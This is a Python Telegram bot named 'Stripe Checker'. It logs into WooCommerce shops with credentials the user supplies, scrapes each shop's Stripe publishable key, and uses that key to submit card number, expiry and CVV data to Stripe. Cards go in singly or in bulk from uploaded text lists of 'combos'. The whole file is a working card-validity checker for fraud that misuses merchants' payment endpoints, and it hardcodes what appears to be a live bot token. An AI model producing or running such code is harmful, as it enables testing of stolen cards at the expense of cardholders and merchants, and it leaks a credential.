import re
import json
import aiohttp
import asyncio
from bs4 import BeautifulSoup
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

BOT_TOKEN = "7678348871:AAFKNVn1IAp46iBcTTOwo31i4WlT2KcZWGE"
user_sessions = {}

async def fetch_site_details(session, site_url):
    async with session.get(site_url, headers={"User-Agent": "Mozilla/5.0"}) as resp:
        html = await resp.text()
        soup = BeautifulSoup(html, "html.parser")
        pk = None
        api_type = None

        for script in soup.find_all("script"):
            if script.string:
                if "pk_live_" in script.string:
                    match = re.search(r"pk_live_[\w]+", script.string)
                    if match:
                        pk = match.group(0)

                if "setupIntent" in script.string:
                    api_type = "setup_intent"
                elif "/v1/payment_methods" in script.string:
                    api_type = "payment_method"
                elif "/v1/tokens" in script.string:
                    api_type = "token"
                elif "/v1/sources" in script.string:
                    api_type = "source"

        return pk, api_type

async def login_and_get_details(site, email, password):
    login_url = f"{site}/my-account/"
    add_pm_url = f"{site}/?wc-ajax=add_payment_method"

    async with aiohttp.ClientSession() as session:
        async with session.get(login_url, headers={"User-Agent": "Mozilla/5.0"}) as resp:
            html = await resp.text()
            nonce = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', html)
            if not nonce:
                return None
            nonce = nonce.group(1)

        payload = {
            "username": email,
            "password": password,
            "woocommerce-login-nonce": nonce,
            "_wp_http_referer": "/my-account/",
            "login": "Log in",
        }

        async with session.post(login_url, data=payload, headers={"User-Agent": "Mozilla/5.0"}) as resp:
            if "customer-logout" not in await resp.text():
                return None

        pk, api_type = await fetch_site_details(session, add_pm_url)
        return {"pk": pk, "api": api_type, "cookies": session.cookie_jar.filter_cookies(site)}

async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        args = update.message.text.split(" ", 1)[1]
        site, email, password = args.strip().split("|")
        user_id = update.effective_user.id

        result = await login_and_get_details(site, email, password)
        if not result or not result["pk"] or not result["api"]:
            await update.message.reply_text("Failed to extract pk or API type.")
            return

        user_sessions[user_id] = {
            "site": site,
            "email": email,
            "password": password,
            "pk": result["pk"],
            "api": result["api"],
            "cookies": result["cookies"],
        }

        await update.message.reply_text(f"Site login saved!\nPK: {result['pk']}\nAPI: {result['api']}")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def process_card(user_id, card):
    try:
        if user_id not in user_sessions:
            return "Error: Login first using /addsitelogin"

        session = user_sessions[user_id]
        cc, mm, yy, cvv = card.strip().split("|")
        yy = yy if len(yy) == 4 else f"20{yy}"

        payload = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
        }

        url = f"https://api.stripe.com/v1/{'payment_methods' if session['api']=='payment_method' else session['api']}"

        if session["api"] == "setup_intent":
            payload["usage"] = "off_session"
        elif session["api"] == "payment_method":
            payload["card[object]"] = "card"

        headers = {
            "User-Agent": "Mozilla/5.0",
            "Authorization": f"Bearer {session['pk']}",
        }

        async with aiohttp.ClientSession(cookies=session["cookies"]) as s:
            async with s.post(url, data=payload, headers=headers) as resp:
                return await resp.text()
    except Exception as e:
        return json.dumps({"error": str(e)})

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        args = update.message.text.split(" ", 1)
        if len(args) < 2:
            await update.message.reply_text("Usage: /chk cc|mm|yy|cvv")
            return

        result = await process_card(update.effective_user.id, args[1])
        await update.message.reply_text(f"`{result}`", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def handle_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = await update.message.document.get_file()
    content = await file.download_as_bytearray()
    combos = content.decode().splitlines()

    user_id = update.effective_user.id
    msg = await update.message.reply_text("Starting check...")

    for idx, combo in enumerate(combos, 1):
        result = await process_card(user_id, combo)
        await msg.edit_text(f"`{result}`", parse_mode="Markdown")
        await asyncio.sleep(1)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Welcome to Stripe Checker.\nUse /addsitelogin site|email|password to begin.")

if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("addsitelogin", addsitelogin))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(MessageHandler(filters.Document.FILE_EXTENSION("txt"), handle_txt))

    app.run_polling()
